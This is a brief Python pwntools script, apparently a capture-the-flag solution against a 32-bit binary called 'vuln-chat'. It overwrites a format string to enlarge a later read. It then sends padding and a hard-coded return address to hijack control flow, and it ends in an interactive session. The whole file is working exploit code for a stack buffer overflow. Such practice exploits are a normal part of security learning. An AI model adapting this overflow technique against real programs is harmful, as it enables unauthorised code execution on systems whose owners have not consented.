#!/usr/bin/python3
import pwn
# run straight
e = pwn.context.binary = pwn.ELF("./vuln-chat")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
    
    +"\n break *main+71"
    +"\n break *main+170"
    +"\nc"
)
#p = e.process()

payload = b"A"*0x14
payload+=b"%199s"#Size of FMT
p.sendline(payload)
payload=b""
p.recvuntil("I know I can trust you?")
payload+=b"A"*49
payload+=pwn.p32(0x0804856b)
#cyclicPattern = pwn.cyclic(200)
#p.sendline(cyclicPattern)
#p.sendline(cyclicPattern)
p.sendline(payload)
p.interactive()


